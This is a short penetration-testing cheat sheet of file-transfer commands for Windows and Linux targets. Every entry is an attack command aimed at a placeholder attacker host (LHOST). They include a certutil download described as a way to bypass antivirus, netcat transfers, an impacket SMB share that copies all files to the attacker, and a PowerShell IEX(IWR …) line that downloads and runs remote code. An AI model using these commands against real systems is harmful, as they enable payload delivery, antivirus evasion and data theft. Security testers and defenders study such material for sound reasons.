# File Transfer

### Certutil  
`certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>` - Transfer files bypass antivirus

### Netcat
`nc -lnvp <LPORT> < <FILE>`  
`nc <RHOST> <RPORT> > <FILE>`

### Impacket
`sudo impacket-smbserver <SHARE> ./`  
`sudo impacket-smbserver <SHARE> . -smb2support`  
`copy * \\<LHOST>\<SHARE>`

### PowerShell
```powershell
iwr <LHOST>/<FILE> -o <FILE>
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\
```
